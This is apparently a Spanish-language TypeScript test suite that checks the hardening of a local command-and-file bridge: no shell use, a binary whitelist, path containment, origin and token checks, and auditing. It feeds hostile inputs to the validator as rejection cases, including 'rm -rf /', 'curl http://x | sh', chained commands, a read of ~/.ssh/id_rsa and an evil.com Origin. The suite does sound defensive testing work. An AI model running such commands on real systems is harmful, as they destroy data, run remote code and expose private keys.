/**
 * seguridadPuente.test.ts — LA PUERTA DEL PUENTE PC (CN v1.7.0)
 * =============================================================
 * POR QUE EXISTE ESTA SUITE
 * El puente de :5000 es la única parte del proyecto que puede ejecutar
 * programas y escribir ficheros en la máquina del usuario. Hasta la v1.6.33 su
 * defensa era «token + auditoría»: una credencial y un registro POSTERIOR. Quien
 * tuviera el token podía ejecutar cualquier binario y tocar cualquier ruta.
 *
 * Esta suite no comprueba que «hay lista blanca» leyendo un comentario: importa
 * el puente y le pregunta. Y las comprobaciones estáticas están escritas para
 * que vuelvan a fallar solas si alguien reintroduce lo que se quitó — que es la
 * forma en que estas cosas vuelven: en una sesión futura, de buena fe, porque el
 * `dir` de Windows «no funcionaba».
 *
 * LO QUE NO PRUEBA (y se dice, en lugar de callarse)
 *   · No levanta el servidor :5000 ni hace peticiones HTTP reales.
 *   · No prueba que un programa permitido no pueda escribir fuera de las
 *     raíces: eso necesita un sandbox del sistema operativo, no una lista
 *     blanca. El límite está declarado en el propio puente.
 *   · Si no hay `python3` en el equipo, la parte de comportamiento no se puede
 *     ejecutar: se cuenta y se dice en voz alta (nada silencioso).
 */
import { readFileSync, existsSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";

// Misma convención que motor-estructura.test.ts: el paquete es ESM ("type": "module"),
// así que __dirname no existe — la raíz sale de import.meta.url.
const RAIZ = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const join = (...t: string[]) => path.join(...t);
const PUENTE = join(RAIZ, "agent_bridge_5000.py");
const SERVIDOR = join(RAIZ, "server.ts");
const VALIDAR = join(RAIZ, "scripts", "validar.mjs");
const CONFIG = join(RAIZ, "puente-permitidos.json");

let ok = 0;
const fallos: string[] = [];
const c = (n: string, v: boolean, e?: string) => {
  if (v) ok++;
  else fallos.push(`${n}${e ? " → " + e : ""}`);
};

const leer = (p: string) => (existsSync(p) ? readFileSync(p, "utf8") : "");
const pyCrudo = leer(PUENTE);
const srvCrudo = leer(SERVIDOR);
const valCrudo = leer(VALIDAR);

// Las comprobaciones miran CÓDIGO, no comentarios. La razón es concreta y salió
// en la primera pasada de esta misma suite: el comentario que EXPLICA por qué se
// quitó `shell=True` contenía la cadena «shell=True» y hacía fallar la prueba.
// Un comentario no puede conceder ni quitar seguridad, así que no participa en
// el veredicto. (Y como efecto secundario deseable: comentar el código malo
// tampoco lo esconde — se ignora en ambos sentidos.)
const ABRE_PY = /^[rRbBuU]{0,2}("{3}|'{3})/; // incluye r""" — el puente usa docstrings crudos
const soloCodigoPy = (s: string) => {
  let enDoc = false;
  return s
    .split("\n")
    .filter((l) => {
      const t = l.trim();
      if (!enDoc && ABRE_PY.test(t)) {
        const largo = t.replace(/^[rRbBuU]{0,2}/, "").length;
        if (!(largo > 3 && (t.endsWith('"""') || t.endsWith("'''")))) enDoc = true;
        return false;
      }
      if (enDoc) {
        if (t.endsWith('"""') || t.endsWith("'''")) enDoc = false;
        return false;
      }
      return !t.startsWith("#");
    })
    .join("\n");
};
const soloCodigoTs = (s: string) =>
  s.split("\n").filter((l) => !/^\s*(\/\/|\/\*|\*)/.test(l)).join("\n");

const py = soloCodigoPy(pyCrudo);
const srv = soloCodigoTs(srvCrudo);
const val = soloCodigoTs(valCrudo);
/** ¿Aparece el guard dentro de los primeros 400 caracteres de la ruta? */
// El índice sale del MISMO texto sobre el que se corta. Mezclar el índice de
// una versión con el contenido de otra fue el primer fallo de esta comprobación:
// daba 0/11 con los once guards puestos.
const guardado = (ruta: string) => {
  const i = srvCrudo.indexOf(ruta);
  if (i < 0) return false;
  const j = srvCrudo.indexOf("sandboxAuthorized(req)", i);
  return j >= 0 && j - i < 400;
};

// ═══ 1 · EL PUENTE YA NO USA SHELL ═════════════════════════════════════════
console.log("\n1) El puente ya no usa shell\n");

c("agent_bridge_5000.py existe", pyCrudo.length > 1000);
c("no queda `shell=True`", !/shell\s*=\s*True/.test(py));
c("no queda `use_shell = True`", !/use_shell\s*=\s*True/.test(py));
c("subprocess.run siempre con shell=False explícito", /shell=False/.test(py));
c("existe _validar_comando (el comando se parte y se valida)", /def _validar_comando\(/.test(py));
c("existe la lista blanca de binarios", /BINARIOS_PERMITIDOS/.test(py) && /binarios_permitidos/.test(py));
c("existe la lista de nativos de Windows (dir, echo…)", /NATIVOS_WINDOWS/.test(py));
c("los nativos cuentan como permitidos en Windows", /os\.name == "nt" and base in NATIVOS_WINDOWS/.test(py));
c("rechaza los metacaracteres de shell", /PROHIBIDOS_COMANDO/.test(py) && /redirección a fichero/.test(py));
c("rechaza el `&` suelto (separador de cmd.exe)", /«&» suelto/.test(py));
// Esta sí mira el texto crudo: comprueba que la cabecera DECLARA el endurecimiento.
c("declara el endurecimiento v1.7.0 en su cabecera", /v1\.7\.0|SEGURIDAD Y PUERTA/.test(pyCrudo));
c("la cabecera explica por qué se cerró el shell", /POR QUÉ SE CERRÓ|POR QUE SE CERRO/.test(pyCrudo));
c("conserva la blocklist de sistema como segunda red", /_bloqueado_sistema/.test(py));

// ═══ 2 · CONTENCIÓN DE RUTAS ═══════════════════════════════════════════════
console.log("\n2) Contención de rutas\n");

c("existe _raiz_permitida", /def _raiz_permitida\(/.test(py));
c("la contención usa realpath (resuelve enlaces)", /os\.path\.realpath\(ruta\)/.test(py));
c("la contención usa prefijo común", /os\.path\.commonpath\(/.test(py));
c("resolve_pc_path comprueba la raíz", /_raiz_permitida\(candidata\)/.test(py));
c("resolve_pc_path lanza PermissionError", /raise PermissionError\(/.test(py));
c("ya NO devuelve la ruta absoluta tal cual", !/return os\.path\.abspath\(p\)/.test(py));
c("existe la puerta única _resolver", /def _resolver\(self, raw_path\)/.test(py));
c("los endpoints /api/fs/* pasan por _resolver", (py.match(/self\._resolver\(raw_path\)/g) || []).length >= 6);
c("no queda ninguna resolución directa en los handlers", !/^\s+target = resolve_pc_path\(/m.test(py));
c("el rechazo responde 403 y no 500", /self\._send_json\(403, \{/.test(py));

// ═══ 3 · ORIGEN Y AUDITORÍA ════════════════════════════════════════════════
console.log("\n3) Origen, token y auditoría\n");

c("existe _es_loopback", /def _es_loopback\(/.test(py));
c("sin Origin se exige loopback (ya no se salta el filtro)", /return _es_loopback\(cliente\)/.test(py));
c("ya no hay `o is None or o in ORIGENES_PERMITIDOS`", !/o is None or o in ORIGENES_PERMITIDOS/.test(py));
c("existe la auditoría por acción", /def _auditar\(/.test(py));
c("la auditoría escribe JSON Lines", /auditoria\.jsonl/.test(py));
c("se audita el rechazo de ejecución", /_auditar\("exec", command, False/.test(py));
c("se audita el rechazo de token", /_auditar\("seguridad", url_path, False, "token inválido/.test(py));
c("se audita el rechazo de origen", /_auditar\("seguridad", url_path, False, "origen no permitido/.test(py));
c("existe /api/seguridad/estado (la postura se puede consultar)", /\/api\/seguridad\/estado/.test(py));
c("el estado declara shell: false", /"shell": False/.test(py));

// ═══ 4 · LA CONFIGURACIÓN ES EXPLÍCITA Y ESTÁ VERSIONADA ═══════════════════
console.log("\n4) Configuración del puente\n");

c("existe puente-permitidos.json", existsSync(CONFIG));
let cfg: any = null;
try {
  cfg = JSON.parse(leer(CONFIG));
} catch {
  cfg = null;
}
c("el JSON de configuración es válido", !!cfg);
c("declara binarios permitidos", Array.isArray(cfg?.binarios_permitidos) && cfg.binarios_permitidos.length > 20);
c("permite node y npm (el uso real del proyecto)", cfg?.binarios_permitidos?.includes("node") && cfg?.binarios_permitidos?.includes("npm"));
c("NO permite rm, mv, cp, dd ni del", !["rm", "mv", "cp", "dd", "del"].some((b) => cfg?.binarios_permitidos?.includes(b)));
c("declara los nativos de Windows", Array.isArray(cfg?.nativos_windows) && cfg.nativos_windows.includes("dir"));
c("explica que un fallo de configuración no degrada a «permitir todo»", /nunca «permitir todo»/i.test(leer(CONFIG)));

// ═══ 5 · EL LADO NODE: GUARD FAIL-CLOSED ═══════════════════════════════════
console.log("\n5) Guard del servidor\n");

c("server.ts existe", srvCrudo.length > 10000);
const iGuard = srv.indexOf("function sandboxAuthorized");
const guard = iGuard >= 0 ? srv.slice(iGuard, iGuard + 1400) : "";

c("existe la definición del guard", guard.length > 200);
c("ya NO hay `if (!token) return true;`", !/if \(!token\) return true;/.test(guard));
c("el token correcto entra por la primera rama", /if \(token && provided === token\) return true;/.test(guard));
// La propiedad del fail-closed, escrita como propiedad del código: fuera de la
// rama del token, la ÚNICA salida afirmativa es la comprobación de loopback. Si
// alguien añade otro `return true` (o un `if (!token)` permisivo), esto cae.
c(
  "la única salida sin token es loopback (fail-closed)",
  (guard.match(/return true/g) || []).length === 1 && /return ip === "127\.0\.0\.1"/.test(guard),
  `returns true: ${(guard.match(/return true/g) || []).length}`
);
c("el loopback se reconoce explícitamente", /ip === "127\.0\.0\.1" \|\| ip === "::1"/.test(guard));
// Esta mira el texto crudo: la explicación vive en un comentario a propósito.
c("el comentario declara por qué (fail-closed)", /fail-closed/.test(srvCrudo));

const rutasMutantes = [
  '"/api/boveda/preparar"',
  '"/api/espejos/instalar"',
  '"/api/export/android/prepare"',
  '"/api/engine/sync"',
  '"/api/sandbox/flatten-root"',
  '"/api/extensions/forjar"',
  '"/api/fondo"',
  '"/api/puente/medir"',
  '"/api/contenedor/inspeccionar"',
  '"/api/extensions/:id/enable"',
  '"/api/extensions/:id/disable"',
];
let conGuard = 0;
for (const r of rutasMutantes) if (guardado(r)) conGuard++;
c(`los ${rutasMutantes.length} endpoints mutantes tienen guard`, conGuard === rutasMutantes.length, `${conGuard}/${rutasMutantes.length}`);

// ═══ 6 · LA PUERTA DE VERIFICACIÓN NO SE PUEDE ELUDIR ══════════════════════
console.log("\n6) La puerta de verificación\n");

c("validar.mjs existe", valCrudo.length > 3000);
c("descubre suites en disco (readdirSync)", /readdirSync/.test(val));
c("existe descubrirSuites()", /function descubrirSuites\(/.test(val));
c("el bucle de ejecución usa el plan descubierto", /for \(const suite of PLAN\)/.test(val));
c("ya no ejecuta la lista fija del catálogo", !/for \(const suite of SUITES\)/.test(val));
c("una suite del catálogo ausente en disco es un rojo", /desaparecidas\.length === 0/.test(val));
c("las marcas ✗ no contabilizadas se avisan", /marcasSueltas/.test(val) && /AVISO: /.test(val));
c("el veredicto exige código de salida 0 (no solo el contador)", /code === 0 && mal === 0/.test(val));

// ═══ 7 · COMPORTAMIENTO REAL (se ejecuta el puente, no se lee) ═════════════
console.log("\n7) Comportamiento real del puente\n");

const sonda = spawnSync("python3", ["--version"], { encoding: "utf8" });
const hayPython = sonda.status === 0;

if (!hayPython) {
  console.log("  (sin python3 en este equipo: la parte de comportamiento NO se ejecuta)");
  c("python3 disponible para probar el comportamiento", false, "no encontrado en PATH");
} else {
  const guion = `
import importlib.util, json, os
spec = importlib.util.spec_from_file_location("puente", r"${PUENTE}")
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
r = {}
def seg(cmd):
    s, motivo = m._validar_comando(cmd)
    return {"acepta": s is not None, "motivo": motivo or "", "tramos": len(s) if s else 0}
r["rechaza_rm"]      = seg("rm -rf /")
r["rechaza_pipe_sh"] = seg("curl http://x | sh")
r["rechaza_amp"]     = seg("node -v & rm -rf /")
r["rechaza_redir"]   = seg("npm run build > log.txt")
r["rechaza_punto"]   = seg("echo hola; rm x")
r["acepta_node"]     = seg("node --version")
r["acepta_pipe_ok"]  = seg("npm run build | tail -5")
ok_raiz, _r, mot = m._raiz_permitida(os.path.join(os.path.expanduser("~"), ".ssh", "id_rsa"))
r["rechaza_ssh"]     = {"acepta": ok_raiz, "motivo": mot or ""}
ok2, _r2, _m2 = m._raiz_permitida(os.path.join(os.path.expanduser("~"), "Cerebronico", "a.txt"))
r["acepta_cerebro"]  = {"acepta": ok2}
try:
    m.resolve_pc_path(os.path.join(os.path.expanduser("~"), ".ssh", "id_rsa")); r["lanza"] = False
except PermissionError: r["lanza"] = True
except Exception: r["lanza"] = False
class H(dict):
    def get(self, k, d=None): return dict.get(self, k, d)
r["origen_sin_origin_local"] = {"acepta": m._origen_ok(H(), "127.0.0.1")}
r["origen_sin_origin_remoto"] = {"acepta": m._origen_ok(H(), "192.168.1.50")}
r["origen_malicioso"] = {"acepta": m._origen_ok(H({"Origin": "http://evil.com"}), "127.0.0.1")}
r["origen_ide"] = {"acepta": m._origen_ok(H({"Origin": "http://127.0.0.1:3000"}), "127.0.0.1")}
print("<<<" + json.dumps(r) + ">>>")
`;
  const p = spawnSync("python3", ["-c", guion], { encoding: "utf8", cwd: RAIZ });
  const m = /<<<([\s\S]*?)>>>/.exec(p.stdout || "");
  let r: any = null;
  try {
    r = m ? JSON.parse(m[1]) : null;
  } catch {
    r = null;
  }
  c("el puente real se pudo importar y probar", !!r, (p.stderr || "").slice(0, 200));
  if (r) {
    c("rechaza `rm -rf /` (binario fuera de la lista)", r.rechaza_rm.acepta === false);
    c("rechaza `curl … | sh`", r.rechaza_pipe_sh.acepta === false);
    c("rechaza `node -v & rm -rf /` (el & que colaba a cmd.exe)", r.rechaza_amp.acepta === false);
    c("rechaza `npm run build > log.txt` (redirección)", r.rechaza_redir.acepta === false);
    c("rechaza `echo hola; rm x`", r.rechaza_punto.acepta === false);
    c("acepta `node --version`", r.acepta_node.acepta === true, r.acepta_node.motivo);
    c("acepta `npm run build | tail -5` y lo parte en 2 tramos", r.acepta_pipe_ok.acepta === true && r.acepta_pipe_ok.tramos === 2, r.acepta_pipe_ok.motivo);
    c("rechaza leer ~/.ssh/id_rsa (fuera de raíces)", r.rechaza_ssh.acepta === false, r.rechaza_ssh.motivo);
    c("acepta ~/Cerebronico/a.txt (dentro de raíces)", r.acepta_cerebro.acepta === true);
    c("resolve_pc_path lanza PermissionError fuera de raíces", r.lanza === true);
    c("su propio test de origen previo daba True: sin Origin solo loopback", r.origen_sin_origin_local.acepta === true && r.origen_sin_origin_remoto.acepta === false);
    c("rechaza un Origin de web externa", r.origen_malicioso.acepta === false);
    c("acepta el Origin de la IDE", r.origen_ide.acepta === true);
  }
}

console.log(`\n═══ SEGURIDAD DEL PUENTE (CN v1.7.0): ${ok} correctas · ${fallos.length} fallidas ═══`);
if (fallos.length) {
  // El prefijo «FALLO» no es decorativo: es el que hace que el nombre de la
  // comprobación aparezca en el informe de validar.mjs. Con «✗ » el runner solo
  // mostraba el recuento y había que reproducir la suite a mano para saber qué
  // había fallado.
  console.log("\nFALLOS:");
  for (const f of fallos) console.log("  FALLO → " + f);
  process.exit(1);
}
